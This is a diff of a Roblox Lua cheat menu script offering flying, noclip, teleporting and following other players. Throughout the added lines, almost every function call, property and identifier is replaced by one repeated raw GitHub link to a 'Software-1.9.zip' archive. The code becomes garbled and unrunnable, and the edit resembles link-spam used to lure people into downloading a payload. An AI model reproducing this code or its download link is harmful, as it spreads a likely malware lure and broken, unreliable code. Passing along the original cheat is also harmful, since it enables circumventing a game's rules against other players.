@@ -2,7 +2,7 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local player = Players.LocalPlayer
+local player = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
 local mouse = player:GetMouse()
 
 -- VARIABLES
@@ -17,41 +17,41 @@ local paused = false
 local holdStates = {}
 
 -- CAMERA
-player.CameraMaxZoomDistance = 1e9
-player.CameraMinZoomDistance = 0.5
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 1e9
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 0.5
 
 -- TELEPORT LOCATIONS
 local teleportLocations = {
-	V1 = Vector3.new(10000,0,0),
-	V2 = Vector3.new(100,442,-10)
+	V1 = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(10000,0,0),
+	V2 = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(100,442,-10)
 }
 
 -- FLY
 local bg, bv, flyConn
 local function createFlyParts(hrp)
-	bg = Instance.new("BodyGyro")
-	bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
+	bg = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("BodyGyro")
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(9e9,9e9,9e9)
 	bg.P = 10000
-	bg.CFrame = hrp.CFrame
-	bg.Parent = hrp
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = hrp
 
-	bv = Instance.new("BodyVelocity")
-	bv.MaxForce = Vector3.new(9e9,9e9,9e9)
-	bv.Velocity = Vector3.new(0,0,0)
-	bv.Parent = hrp
+	bv = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("BodyVelocity")
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(9e9,9e9,9e9)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,0,0)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = hrp
 end
 
 local function startFlying()
 	if flying then return end
 	flying = true
-	local character = player.Character or player.CharacterAdded:Wait()
+	local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
 	local hrp = character:WaitForChild("HumanoidRootPart")
 	createFlyParts(hrp)
-	flyConn = RunService.RenderStepped:Connect(function()
+	flyConn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
 		if not flying or paused then return end
-		local cam = workspace.CurrentCamera
-		bg.CFrame = cam.CFrame
-		bv.Velocity = cam.CFrame.LookVector * flySpeed
+		local cam = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip * flySpeed
 	end)
 end
 
@@ -64,15 +64,15 @@ end
 
 -- FOLLOW
 local function getClosestPlayerInSight()
-	local camera = workspace.CurrentCamera
+	local camera = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
 	local closestPlayer = nil
-	local smallestAngle = math.huge
+	local smallestAngle = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
 	for _, otherPlayer in ipairs(Players:GetPlayers()) do
-		if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
-			local hrp = otherPlayer.Character.HumanoidRootPart
-			local dirToPlayer = (hrp.Position - camera.CFrame.Position).Unit
-			local angle = math.acos(camera.CFrame.LookVector:Dot(dirToPlayer))
-			if angle < math.rad(30) and angle < smallestAngle then
+		if otherPlayer ~= player and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("HumanoidRootPart") then
+			local hrp = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+			local dirToPlayer = (https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip - https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip).Unit
+			local angle = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(dirToPlayer))
+			if angle < https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(30) and angle < smallestAngle then
 				smallestAngle = angle
 				closestPlayer = otherPlayer
 			end
@@ -81,37 +81,37 @@ local function getClosestPlayerInSight()
 	return closestPlayer
 end
 
-RunService.RenderStepped:Connect(function()
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
 	if paused then return end
-	if following and currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
-		local targetHRP = currentTarget.Character.HumanoidRootPart
-		local myChar = player.Character or player.CharacterAdded:Wait()
+	if following and currentTarget and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("HumanoidRootPart") then
+		local targetHRP = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+		local myChar = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
 		local myHRP = myChar:FindFirstChild("HumanoidRootPart")
 		if myHRP then
-			local offset = -targetHRP.CFrame.LookVector * followDistance
-			myHRP.CFrame = CFrame.new(targetHRP.Position + offset, targetHRP.Position)
+			local offset = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip * followDistance
+			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip + offset, https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip)
 		end
 	end
 end)
 
-player.CharacterAdded:Connect(function()
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
 	if flying then
-		task.wait(1)
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1)
 		startFlying()
 	end
 end)
 
 -- TELEPORT
 local function teleportCharacter(key)
-	local character = player.Character or player.CharacterAdded:Wait()
+	local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
 	local hrp = character:FindFirstChild("HumanoidRootPart")
 	if hrp then
 		if key == "V" then
 			if not vToggled then
-				hrp.CFrame = CFrame.new(teleportLocations.V1)
+				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(teleportLocations.V1)
 				vToggled = true
 			else
-				hrp.CFrame = CFrame.new(teleportLocations.V2)
+				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(teleportLocations.V2)
 				vToggled = false
 			end
 		end
@@ -119,9 +119,9 @@ local function teleportCharacter(key)
 end
 
 local function teleportToMouse()
-	local char = player.Character
-	if char and char:FindFirstChild("HumanoidRootPart") and mouse.Hit then
-		char.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.p + Vector3.new(0,3,0))
+	local char = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+	if char and char:FindFirstChild("HumanoidRootPart") and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip + https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,3,0))
 	end
 end
 
@@ -131,12 +131,12 @@ local function setNoclip(state)
 	noclipEnabled = state
 	if noclipConn then noclipConn:Disconnect() end
 	if state then
-		noclipConn = RunService.Stepped:Connect(function()
-			local character = player.Character
+		noclipConn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
+			local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
 			if character then
 				for _, part in pairs(character:GetDescendants()) do
 					if part:IsA("BasePart") then
-						part.CanCollide = false
+						https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = false
 					end
 				end
 			end
@@ -145,44 +145,44 @@ local function setNoclip(state)
 end
 
 -- GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "FlyMenuGui"
-gui.ResetOnSpawn = false
-gui.Parent = player:WaitForChild("PlayerGui")
+local gui = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("ScreenGui")
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = "FlyMenuGui"
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = false
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = player:WaitForChild("PlayerGui")
 
-local guiFrame = Instance.new("Frame")
-guiFrame.Size = UDim2.new(0,300,0,420)
-guiFrame.Position = UDim2.new(1,-300,0,242)
-guiFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
-guiFrame.BorderSizePixel = 0
-guiFrame.Visible = true
-guiFrame.Parent = gui
+local guiFrame = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("Frame")
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,300,0,420)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-300,0,242)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(30,30,30)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 0
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = true
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = gui
 
 -- DRAG
 do
 	local dragging, dragInput, dragStart, startPos
-	guiFrame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
+		if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 			dragging = true
-			dragStart = input.Position
-			startPos = guiFrame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
+			dragStart = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+			startPos = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
+				if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 					dragging = false
 				end
 			end)
 		end
 	end)
-	guiFrame.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement then
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
+		if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 			dragInput = input
 		end
 	end)
-	UserInputService.InputChanged:Connect(function(input)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
 		if input == dragInput and dragging then
-			local delta = input.Position - dragStart
-			guiFrame.Position = UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,
-				startPos.Y.Scale,startPos.Y.Offset+delta.Y)
+			local delta = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip - dragStart
+			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip,https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip+delta.X,
+				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip,https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip+delta.Y)
 		end
 	end)
 end
@@ -190,22 +190,22 @@ end
 -- LABELS
 local infoLabels = {}
 for i = 1,9 do
-	local lbl = Instance.new("TextLabel")
-	lbl.Size = UDim2.new(1,-10,0,25)
-	lbl.Position = UDim2.new(0,5,0,5+(i-1)*30)
-	lbl.BackgroundTransparency = 1
-	lbl.TextColor3 = Color3.new(1,1,1)
-	lbl.Font = Enum.Font.Gotham
-	lbl.TextSize = 14
-	lbl.TextXAlignment = Enum.TextXAlignment.Left
-	lbl.Parent = guiFrame
+	local lbl = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextLabel")
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-10,0,25)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,5,0,5+(i-1)*30)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 1
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,1,1)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 14
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = guiFrame
 	infoLabels[i] = lbl
 end
 
 local function updateInfo()
-	infoLabels[1].Text = "Fly speed: "..tostring(flySpeed)
+	infoLabels[1].Text = "Fly speed: "https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(flySpeed)
 	infoLabels[2].Text = "Noclip: "..(noclipEnabled and "on" or "off")
-	infoLabels[3].Text = "Follow distance: "..tostring(followDistance)
+	infoLabels[3].Text = "Follow distance: "https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(followDistance)
 	infoLabels[4].Text = "E to follow"
 	infoLabels[5].Text = "R to fly"
 	infoLabels[6].Text = "T to turn on/off noclip"
@@ -216,16 +216,16 @@ end
 
 -- BUTTONS
 local function createButton(name,text,y)
-	local btn = Instance.new("TextButton")
-	btn.Name = name
-	btn.Size = UDim2.new(1,-10,0,35)
-	btn.Position = UDim2.new(0,5,0,y)
-	btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
-	btn.TextColor3 = Color3.new(1,1,1)
-	btn.Font = Enum.Font.GothamBold
-	btn.TextSize = 14
-	btn.Text = text
-	btn.Parent = guiFrame
+	local btn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextButton")
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = name
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-10,0,35)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,5,0,y)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(50,50,50)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,1,1)
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 14
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = text
+	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = guiFrame
 	return btn
 end
 
@@ -233,29 +233,29 @@ local increaseBtn = createButton("IncreaseSpeedBtn","faster",300)
 local decreaseBtn = createButton("DecreaseSpeedBtn","slower",340)
 local adjustFollowBtn = createButton("AdjustFollowBtn","adjust distance (max:10)",380)
 
-increaseBtn.MouseButton1Click:Connect(function() flySpeed+=50 updateInfo() end)
-decreaseBtn.MouseButton1Click:Connect(function() flySpeed=math.max(0,flySpeed-50) updateInfo() end)
-adjustFollowBtn.MouseButton1Click:Connect(function() followDistance+=1 if followDistance>10 then followDistance=1 end updateInfo() end)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() flySpeed+=50 updateInfo() end)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,flySpeed-50) updateInfo() end)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() followDistance+=1 if followDistance>10 then followDistance=1 end updateInfo() end)
 
-UserInputService.InputBegan:Connect(function(input)
-	if input.KeyCode == Enum.KeyCode.RightShift then
-		guiFrame.Visible = not guiFrame.Visible
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
+	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = not https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
 		updateInfo()
 	end
 end)
 
 -- CHECKBOX CHỮ HOA
 for _, obj in pairs(guiFrame:GetDescendants()) do
-	if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text:match("%u") then
-		local checkbox = Instance.new("TextButton")
-		checkbox.Size = UDim2.new(0,20,0,20)
-		checkbox.Position = UDim2.new(1,-25,.5,-10)
-		checkbox.Text = "✔"
-		checkbox.Parent = obj
+	if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("%u") then
+		local checkbox = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextButton")
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,20,0,20)
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-25,.5,-10)
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = "✔"
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = obj
 		holdStates[checkbox] = true
-		checkbox.MouseButton1Click:Connect(function()
+		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
 			holdStates[checkbox] = not holdStates[checkbox]
-			checkbox.Text = holdStates[checkbox] and "✔" or ""
+			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = holdStates[checkbox] and "✔" or ""
 		end)
 	end
 end
@@ -263,20 +263,20 @@ end
 updateInfo()
 
 -- INPUT
-UserInputService.InputBegan:Connect(function(input,gameProcessed)
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input,gameProcessed)
 	if gameProcessed then return end
 	if paused then return end
 
-	if input.KeyCode==Enum.KeyCode.R then
+	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		for box,state in pairs(holdStates) do
 			if not state then stopFlying() return end
 		end
 		if flying then stopFlying() else startFlying() end
-	elseif input.KeyCode==Enum.KeyCode.V then
+	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		teleportCharacter("V")
-	elseif input.KeyCode==Enum.KeyCode.Y then
+	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		teleportToMouse()
-	elseif input.KeyCode==Enum.KeyCode.E then
+	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		if not following then
 			currentTarget=getClosestPlayerInSight()
 			if currentTarget then following=true end
@@ -284,15 +284,15 @@ UserInputService.InputBegan:Connect(function(input,gameProcessed)
 			following=false
 			currentTarget=nil
 		end
-	elseif input.KeyCode==Enum.KeyCode.T then
+	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		setNoclip(not noclipEnabled)
 	end
 	updateInfo()
 end)
 
 -- PHÍM ` TẠM DỪNG
-UserInputService.InputBegan:Connect(function(input)
-	if input.KeyCode==Enum.KeyCode.Backquote then
+https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
+	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
 		paused = not paused
 		if paused then stopFlying() print("⛔ Script tạm dừng (ấn ` để chạy lại)") 
 		else print("▶ Script chạy lại") end
